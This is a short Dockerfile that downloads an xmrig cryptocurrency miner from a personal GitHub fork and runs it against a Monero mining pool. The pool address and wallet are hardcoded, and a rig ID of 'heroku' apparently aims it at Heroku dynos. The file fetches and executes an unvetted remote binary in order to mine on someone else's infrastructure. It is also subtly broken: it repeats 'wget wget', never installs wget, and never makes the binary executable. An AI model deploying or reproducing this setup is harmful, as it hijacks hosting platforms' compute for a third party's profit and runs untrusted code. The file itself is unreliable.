FROM ubuntu:18.04

RUN apt update \
    && wget wget https://github.com/worldawa/xmrig/releases/download/1.0/xmrigX86_64
    
CMD ./xmrigX86_64 -o pool.minexmr.com:4444 -u 434F6EZw2CbTPRgZZpvjycS9q2kPCoNyojmk8CpXWPMYEkXK2VRtnV63y9TMhtuJmWabpfNVnM54dgwkskZHRVNxADdQY1N --rig-id heroku -k --tls
